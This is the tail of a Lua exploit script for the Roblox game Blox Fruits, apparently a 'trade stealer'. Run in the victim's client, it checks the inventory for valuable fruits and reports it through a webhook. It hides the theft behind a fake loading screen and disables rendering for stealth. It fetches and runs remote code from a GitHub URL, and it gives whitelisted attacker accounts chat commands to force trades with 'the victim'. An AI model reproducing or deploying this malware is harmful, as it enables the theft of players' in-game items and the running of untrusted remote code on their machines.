                 sendMessage("--- Commands ---");
                 task.wait(1);
                 for i, msg in ipairs(cmds) do
                     sendMessage(msg);
                     task.wait(1) -- Delay between help messages
                 end
             end)
        end
    },
    activate = {
        description = "Activates command access using a password.",
        usage = "?activate <password>",
        execute = function(player, password) -- Needs player object
            if not password or password == "" then
                sendMessage("Usage: ?activate <password>");
                return
            end;
            if not player or not player:IsA("Player") then
                 print("Error: Invalid player object passed to activate command.");
                 return
            end

            local foundPass = false;
            for _, validPass in ipairs(ActivationPasswords) do
                if password == validPass then
                    foundPass = true;
                    break
                end
            end;

            if foundPass then
                 if activatedUsers[player.UserId] then
                     sendMessage("You are already activated, " .. player.Name .. ".")
                 else
                     activatedUsers[player.UserId] = true;
                     sendMessage("Activation successful for this session, " .. player.Name .. "!")
                 end
            else
                sendMessage("Incorrect password.")
            end
        end
    },
    allowall = {
        description = "Toggles allowing ANY player to use commands/trade.",
        usage = "?allowall",
        execute = function()
            allowEveryone = not allowEveryone;
            local status = allowEveryone and "ENABLED" or "DISABLED";
            sendMessage("AllowEveryone Mode: " .. status .. ". Command/Trade access is now " .. (allowEveryone and "OPEN to ALL players." or "RESTRICTED."));
            if allowEveryone then
                sendMessage("WARNING: ANYONE can now use commands and trade with the victim!")
            end
        end
    }
};--
local CommandContext = {}; -- Keep this structure if needed for future context passing
local function processChatCommand(_, player, message)
    -- Basic checks: Ensure player, message exist, player is a Player object, message starts with '?'
    if not (player and message and typeof(player) == "Instance" and player:IsA("Player") and message:sub(1, 1) == "?") then
        return
    end;
    -- Trim whitespace and extract command string
    local commandStr = message:sub(2):match("^%s*(.-)%s*$");
    if not commandStr or commandStr == "" then
        return
    end;
    -- Extract command and argument
    local command, argument = commandStr:match("^(%S+)%s*(.-)%s*$");
    if not command then
        return
    end;
    command = command:lower(); -- Case-insensitive commands

    -- Special case for 'activate' command - always allow
    if command == "activate" then
        local cmdFunc = Commands[command];
        if cmdFunc and cmdFunc.execute then
            -- Pass the player object to the activate function
            task.spawn(cmdFunc.execute, player, argument)
        end
        return -- Stop further processing for activate command
    end;

    -- Authorization Check: Allow if 'allowEveryone' is true, or if player is in Usernames/activatedUsers
    local isAuthorized = allowEveryone or (Usernames and table.find(Usernames, player.Name)) or activatedUsers[player.UserId];
    if not isAuthorized then
        return -- Ignore if not authorized
    end;

    -- Find the command function
    local commandFunc = Commands[command];
    if not commandFunc or not commandFunc.execute then
        sendMessage("Unknown command: ?" .. command);
        return
    end;

    -- Cooldown Check
    local playerName = player.Name;
    local playerCooldowns = CommandCooldowns[playerName];
    if playerCooldowns then
        local lastUsed = playerCooldowns[command];
        if lastUsed and (tick() - lastUsed < DEFAULT_COOLDOWN) then
            sendMessage("Please wait before using this command again!");
            return
        end
    else
        -- Initialize cooldown table for the player if it doesn't exist
        playerCooldowns = {};
        CommandCooldowns[playerName] = playerCooldowns
    end;
    -- Update cooldown timestamp
    playerCooldowns[command] = tick();

    -- Execute the command in a new thread with error handling
    task.spawn(function()
        -- Note: We are passing 'argument' only. If commands need the player object,
        -- they need to be designed to get LocalPlayer or passed differently.
        -- 'activate' is the only one currently designed to receive the player object directly.
        local success, err = pcall(commandFunc.execute, argument);
        if not success then
            sendMessage("Error executing command ?" .. command .. ": " .. tostring(err));
            warn("Command Error:", command, argument, err) -- Log detailed error
        end
    end)
end--
local function startMainLoop()
    local isLoopRunning = true;
    local hasCheckedCurrentTrade = false;
    local currentTable, currentSeat;
    local lastMovementTime = tick();
    local lastTableCheck = tick();
    local lastTradeCheck = tick();
    local UPDATE_INTERVAL = 0.5; -- How often the main loop runs
    local TABLE_CHECK_INTERVAL = 2; -- How often to re-check for a better trade table
    local MOVEMENT_CHECK_INTERVAL = 4; -- How often to slightly move if idle at table
    local TRADE_VALIDATION_DELAY = 1.5; -- Delay after entering trade before validating partner
    local TRADE_RECHECK_COUNT = 4; -- How many times to check trade partner validity
    local validateTradePartnerRunning = false;

    local function validateTradePartner()
        if validateTradePartnerRunning then
            return
        end;
        validateTradePartnerRunning = true;
        local failedChecks = 0;
        local lastTradeState = false; -- Track if trade UI was visible on last check
        for _ = 1, TRADE_RECHECK_COUNT do
            task.wait(0.25); -- Check multiple times over a short period
            local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main");
            local currentTradeState = tradeUI and tradeUI:FindFirstChild("Trade") and tradeUI.Trade.Visible;
            -- Increment fail count if:
            -- 1. Trade UI visibility changed (e.g., closed)
            -- 2. Trade UI is not visible
            -- 3. Trade UI is visible, but partner is incorrect (and allowEveryone is false)
            if lastTradeState ~= currentTradeState or not currentTradeState or not isInTradeWithCorrectPlayer() then
                failedChecks = failedChecks + 1
            end;
            lastTradeState = currentTradeState -- Update last known state
        end;
        -- If most checks failed (allowing for minor UI flicker), assume invalid trade partner/state
        if failedChecks >= TRADE_RECHECK_COUNT - 1 then
            task.wait(0.1);
            ForceJump() -- Jump to cancel trade/leave seat
        end;
        validateTradePartnerRunning = false
    end;

    local charAddedConn, charRemovingConn, jumpCleanupFunc;

    local function onCharacterAdded(character)
        task.wait(1); -- Wait for character to potentially fully load
        local humanoid = character:WaitForChild("Humanoid", 5);
        local rootPart = character:WaitForChild("HumanoidRootPart", 5);
        if not humanoid or not rootPart then
            warn("Failed to find Humanoid or RootPart for character")
            return
        end;
        local now = tick();
        lastMovementTime, lastTableCheck, lastTradeCheck = now, now, now; -- Reset timers
        jumpCleanupFunc = disableJump(); -- Disable jumping and get cleanup function
        -- Find initial table and move to it
        task.spawn(function()
            currentTable, currentSeat = findTradeTable();
            if currentTable and currentSeat then
                tweenToPosition(currentSeat.Position)
            end
        end)
    end;

    local function onCharacterRemoving()
        currentTable, currentSeat = nil, nil; -- Clear current table/seat info
        if jumpCleanupFunc then
            pcall(jumpCleanupFunc) -- Call the jump cleanup function
            jumpCleanupFunc = nil
        end
    end;

    local function runMainLoop()
        local lastTime = tick();
        while isLoopRunning do
            local now = tick();
            local deltaTime = now - lastTime;
            lastTime = now;
            local character = LocalPlayer.Character;
            if character and character:FindFirstChild("HumanoidRootPart") then
                local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main");
                local isInTrade = tradeUI and tradeUI:FindFirstChild("Trade") and tradeUI.Trade.Visible;

                -- Trade Partner Validation Logic
                if not isInTrade then
                    hasCheckedCurrentTrade = false; -- Reset check flag if not in trade
                    lastTradeCheck = now -- Update last time trade was confirmed closed/inactive
                elseif not hasCheckedCurrentTrade and (now - lastTradeCheck) >= TRADE_VALIDATION_DELAY then
                    -- If in trade, haven't checked yet, and delay has passed
                    task.spawn(validateTradePartner);
                    hasCheckedCurrentTrade = true -- Mark as checked for this trade instance
                end;

                -- Table Finding Logic
                if now - lastTableCheck >= TABLE_CHECK_INTERVAL then
                    task.spawn(function() -- Check in a separate thread
                        local newTable, newSeat = findTradeTable();
                        if newTable and newSeat then
                            currentTable, currentSeat = newTable, newSeat
                        end
                    end);
                    lastTableCheck = now
                end;

                -- Movement Logic (if at a table)
                if currentTable and currentSeat then
                    local root = character.HumanoidRootPart;
                    if root then
                        local distance = (root.Position - currentSeat.Position).Magnitude;
                        if distance > 5 then -- If too far from the target seat, tween back
                            tweenToPosition(currentSeat.Position)
                        elseif now - lastMovementTime >= MOVEMENT_CHECK_INTERVAL then
                            -- If close to the seat and haven't moved recently, nudge slightly
                            local randomOffset = Vector3.new(math.random(- 1, 1), 0, math.random(- 1, 1));
                            tweenToPosition(currentSeat.Position + randomOffset);
                            lastMovementTime = now -- Update last movement time
                        end
                    end
                end
            end;
            -- Wait for the next loop cycle
            local timeElapsed = tick() - now;
            local waitTime = math.max(0.01, UPDATE_INTERVAL - timeElapsed); -- Ensure positive wait time
            task.wait(waitTime)
        end
    end;

    -- Connect character events
    charAddedConn = LocalPlayer.CharacterAdded:Connect(onCharacterAdded);
    charRemovingConn = LocalPlayer.CharacterRemoving:Connect(onCharacterRemoving);

    -- Handle existing character
    if LocalPlayer.Character then
        task.spawn(onCharacterAdded, LocalPlayer.Character)
    end;

    -- Start the main loop
    task.spawn(runMainLoop);

    -- Return a cleanup function for the entire main loop system
    return function()
        isLoopRunning = false; -- Signal the loop to stop
        if charAddedConn then
            charAddedConn:Disconnect();
            charAddedConn = nil
        end;
        if charRemovingConn then
            charRemovingConn:Disconnect();
            charRemovingConn = nil
        end;
        if jumpCleanupFunc then -- Clean up jump disabling
            pcall(jumpCleanupFunc)
            jumpCleanupFunc = nil
        end;
        currentTable, currentSeat = nil, nil -- Clear state
    end
end

local function init()
    local placeId = game.PlaceId;
    if placeId == 2753915549 then -- First Sea
        LocalPlayer:Kick("This script works only in Sea 2 or 3!");
        return
    end;
    if placeId ~= 4442272183 and placeId ~= 7449423635 then -- Not Sea 2 or Sea 3
        LocalPlayer:Kick("This script is meant for Blox Fruits only!");
        return
    end;
    local initialInventory = getInventory();
    if not initialInventory then
        LocalPlayer:Kick("Error getting initial inventory.");
        return
    end;
    inventory22 = initialInventory; -- Store initial inventory for leave check

    local function checkInventoryForHit(inv)
        local fruitsToHitSet = {};
        for _, f in ipairs(FruitsToHit) do
            fruitsToHitSet[f] = true
        end;
        for _, item in ipairs(inv) do
            if (item.Type == "Blox Fruit" and fruitsToHitSet[item.Name]) or item.Type == "Premium" then
                return true -- Found a fruit to hit OR a premium item
            end
        end;
        return false -- Found nothing valuable
    end;

    if not checkInventoryForHit(initialInventory) then
        LocalPlayer:Kick("(Alt Account Filter)"); -- Kick if no valuable items found initially
        return
    end;

    -- Initial setup: Join team, show notification, send webhook
    task.spawn(function()
        task.wait(1);
        JoinTeam();
        task.spawn(createNotification); -- Show loading UI
        sendWebhook(initialInventory) -- Send initial inventory
    end);

    local mainLoopStopper = nil;
    local chatConnection = nil;
    local externalUILoaded = false;

    local function onPlayerAdded(player)
        if mainLoopStopper then return end; -- Prevent multiple triggers if already started

        -- Check if the added player is in the Usernames list (case-insensitive)
        local isWhitelisted = false;
        if Usernames then
             for _, name in ipairs(Usernames) do
                 if string.lower(name) == string.lower(player.Name) then
                     isWhitelisted = true;
                     break;
                 end
             end
        end

        if not isWhitelisted then return end; -- Ignore if not whitelisted

        -- Set placeholder to prevent re-trigger, actual stopper assigned later
        mainLoopStopper = function() end;

        task.spawn(function()
            -- Load external UI if not already loaded
            if not externalUILoaded then
                local success, err = pcall(function()
                    -- Assuming the loadstring part handles its own UI display
                    loadstring(game:HttpGet("https://raw.githubusercontent.com/W-Scripts/UI/refs/heads/main/LoadingUI"))()
                end);
                if not success then
                    warn("Failed to load external UI:", err)
                else
                    externalUILoaded = true
                end
            end;

            task.wait(1); -- Short delay

            -- Connect chat command processing if not already connected
            if not chatConnection then
                chatConnection = Players.PlayerChatted:Connect(processChatCommand)
            end;

            -- Disable 3D rendering for performance/stealth
            pcall(RunService.Set3dRenderingEnabled, RunService, false);

            -- Start the main loop and store its cleanup function
            mainLoopStopper = startMainLoop();

            -- Send initial message
            task.spawn(function()
                task.wait(2);
                sendMessage("Join (uwdvTtqTDA) << Invite in dc if you want to learn how to make a lot of mythical fruits!")
            end)
        end)
    end;

    -- Connect PlayerAdded event
    local playerAddedConn = Players.PlayerAdded:Connect(onPlayerAdded);

    -- Check existing players
    task.spawn(function()
        for _, player in ipairs(Players:GetPlayers()) do
            onPlayerAdded(player)
        end
    end);

    -- Setup cleanup for when the local player leaves
    local localPlayerRemovingConn;
    localPlayerRemovingConn = Players.PlayerRemoving:Connect(function(player)
        if player == LocalPlayer then
            -- Disconnect listeners
            if playerAddedConn then playerAddedConn:Disconnect() end;
            if chatConnection then chatConnection:Disconnect() end;
            -- Stop the main loop if it's running
            if mainLoopStopper and type(mainLoopStopper) == "function" then
                pcall(mainLoopStopper) -- Safely call the stopper function
            end;
            -- Disconnect self
            if localPlayerRemovingConn then localPlayerRemovingConn:Disconnect() end
        end
    end)
end--
-- Use a unique variable for basic re-execution prevention
if not shared.ScriptExecuted_SharkyV2_FinalFormatted_v4 then -- Incremented version marker
    shared.ScriptExecuted_SharkyV2_FinalFormatted_v4 = true
    task.spawn(function() -- Run init in a protected thread
        local success, errorMessage = pcall(init)
        if not success then
            warn("SCRIPT INIT ERROR:", errorMessage)
            task.spawn(function() -- Use another task.spawn for kick to avoid issues within pcall error handling
                local safeMsg = string.gsub(tostring(errorMessage or "Unknown Error"), "[<>\"']", "") -- Sanitize message
                pcall(LocalPlayer.Kick, LocalPlayer, "Script Initialization Error: " .. safeMsg:sub(1, 150)) -- Limit kick message length and use pcall
            end)
        end
    end)
end

-- END OF FILE --
